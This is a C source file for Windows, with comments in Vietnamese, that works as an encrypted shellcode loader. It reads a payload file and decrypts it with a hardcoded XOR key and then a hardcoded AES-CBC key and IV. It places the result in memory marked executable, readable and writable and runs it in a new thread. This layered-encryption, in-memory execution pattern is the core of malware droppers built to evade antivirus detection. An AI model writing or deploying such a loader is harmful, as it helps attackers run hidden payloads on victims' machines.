#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "aes.h"
#include "aes.c"

// Hàm đọc dữ liệu từ tệp .bin (định dạng raw)
unsigned char* readFromFile(const char* filePath, size_t* dataSize) {
    FILE* file = fopen(filePath, "rb");
    if (file == NULL) {
        printf("Failed to open file %s for reading\n", filePath);
        return NULL;
    }

    // Lấy kích thước tệp
    fseek(file, 0, SEEK_END);
    *dataSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    if (*dataSize == 0) {
        printf("File %s is empty\n", filePath);
        fclose(file);
        return NULL;
    }

    // Cấp phát bộ đệm
    unsigned char* data = (unsigned char*)malloc(*dataSize);
    if (data == NULL) {
        printf("Failed to allocate memory\n");
        fclose(file);
        return NULL;
    }

    // Đọc dữ liệu
    size_t bytesRead = fread(data, sizeof(unsigned char), *dataSize, file);
    if (bytesRead != *dataSize) {
        printf("Failed to read data from file\n");
        free(data);
        fclose(file);
        return NULL;
    }

    fclose(file);
    return data;
}

// Hàm giải mã XOR
void xorDecrypt(PBYTE payload, size_t payload_len, PBYTE key, size_t key_len) {
    for (size_t i = 0; i < payload_len; ++i) {
        payload[i] ^= key[i % key_len];
    }
}

int main() {
    // Khóa XOR, AES và IV được tích hợp trực tiếp
    unsigned char aesKey[] = { 0xb4, 0xde, 0x68, 0x23, 0x99, 0x35, 0x9e, 0x1c, 0x22, 0x7d, 0x5a, 0x69, 0xf6, 0x16, 0x8e, 0x09, 0xa3, 0xa4, 0x65, 0x48, 0xd8, 0x6b, 0x1c, 0x41, 0xd6, 0xfb, 0x13, 0xa2, 0x21, 0x12, 0x24, 0xaf };
    unsigned char aesIv[] = { 0xe6, 0x74, 0xe6, 0xad, 0xb4, 0x7a, 0xcb, 0x59, 0xdc, 0xc1, 0xfa, 0x01, 0x84, 0x27, 0xea, 0x11 };
    unsigned char xorKey[] = { 0xb8, 0xd8, 0xeb, 0xe2, 0x79, 0xc5, 0xe6, 0x20, 0x2e, 0x7b, 0xd9, 0xa8, 0x16, 0xe6 };


    // Đường dẫn đến tệp shellcode đã mã hóa
    const char* inputFilePath = "...\.bin";
    size_t shellcodeSize;

    // Đọc shellcode từ tệp
    unsigned char* shellcode = readFromFile(inputFilePath, &shellcodeSize);
    if (shellcode == NULL) {
        return 1;
    }

    // Kiểm tra kích thước shellcode
    //if (shellcodeSize != 204896) {
    //    printf("Unexpected shellcode size: %zu bytes (expected 204896 bytes)\n", shellcodeSize);
    //    free(shellcode);
    //    return 1;
    //}

    // Giải mã XOR
    printf("XOR decrypting...\n");
    xorDecrypt(shellcode, shellcodeSize, xorKey, sizeof(xorKey));

    // In shellcode sau khi giải mã XOR
    printf("Shellcode after XOR decryption:\n");
    for (size_t i = 0; i < shellcodeSize && i < 64; ++i) {
        printf("\\x%02x", shellcode[i]);
    }
    if (shellcodeSize > 64) printf("... (truncated)");
    printf("\n-----------------------------------------------\n");

    // Giải mã AES-CBC
    printf("AES decrypting...\n");
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, aesKey, aesIv);
    AES_CBC_decrypt_buffer(&ctx, shellcode, shellcodeSize);

    // In shellcode sau khi giải mã AES
    printf("Decrypted shellcode:\n");
    for (size_t i = 0; i < shellcodeSize && i < 64; ++i) {
        printf("\\x%02x", shellcode[i]);
    }
    if (shellcodeSize > 64) printf("... (truncated)");
    printf("\n-----------------------------------------------\n");

    // Cấp phát bộ nhớ thực thi
    PVOID pBuffer = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pBuffer == NULL) {
        printf("Failed to allocate memory\n");
        free(shellcode);
        return 1;
    }

    // Sao chép shellcode vào bộ nhớ
    memcpy(pBuffer, shellcode, shellcodeSize);

    // Tạo luồng để thực thi shellcode
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(pBuffer), NULL, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create thread\n");
        VirtualFree(pBuffer, 0, MEM_RELEASE);
        free(shellcode);
        return 1;
    }

    // Chờ luồng hoàn tất
    WaitForSingleObject(hThread, INFINITE);

    // Dọn dẹp
    CloseHandle(hThread);
    VirtualFree(pBuffer, 0, MEM_RELEASE);
    free(shellcode);

    return 0;
}